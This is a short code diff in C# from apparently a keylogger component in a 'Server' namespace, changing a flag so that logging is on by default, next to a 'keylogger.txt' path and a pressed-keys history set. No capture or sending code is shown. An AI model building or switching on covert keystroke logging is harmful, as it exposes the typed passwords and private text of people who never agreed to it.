@@ -22,7 +22,7 @@ namespace Server
         //private static string logName = "Log_";
         //private static string logExtendtion = ".txt";
         static string pathKeylogger = "keylogger.txt";
-        static bool isStarted = false;
+        static bool isStarted = true;
         private static DateTime timeStart;
         private static DateTime timeStop;
         private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
